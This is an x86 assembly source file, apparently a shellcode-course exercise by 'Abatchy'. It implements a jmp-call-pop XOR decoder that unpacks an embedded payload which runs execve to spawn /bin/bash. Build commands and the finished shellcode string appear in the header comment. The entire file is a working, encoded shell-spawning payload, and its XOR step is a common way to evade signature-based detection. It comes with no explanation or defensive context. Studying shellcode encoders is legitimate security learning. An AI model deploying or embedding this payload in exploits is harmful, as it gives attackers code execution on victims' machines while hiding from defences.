; XORExecveBashStack.asm
; by Abatchy
;
;   nasm -felf32 XORExecveBashStack.asm && ld -o XORExecveBashStack XORExecveBashStack.o
; Generated shellcode: "\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa"


global _start

section .text

_start:
    
    jmp short get_shellcode_addr
ReturnLabel:
    pop esi

decode:
    xor byte [esi], 0xaa
    jz shellcode
    inc esi
    jmp short decode

get_shellcode_addr:
    call ReturnLabel
    shellcode: db 0x9b, 0x6a, 0xfa, 0xc2, 0xc8, 0xcb, 0xd9, 0xc2, 0xc2, 0xc8, 0xc3, 0xc4, 0x85, 0xc2, 0x85, 0x85, 0x85, 0x85, 0x23, 0x49, 0xfa, 0x23, 0x48, 0xf9, 0x23, 0x4b, 0x1a, 0xa1, 0x67, 0x2a, 0xaa
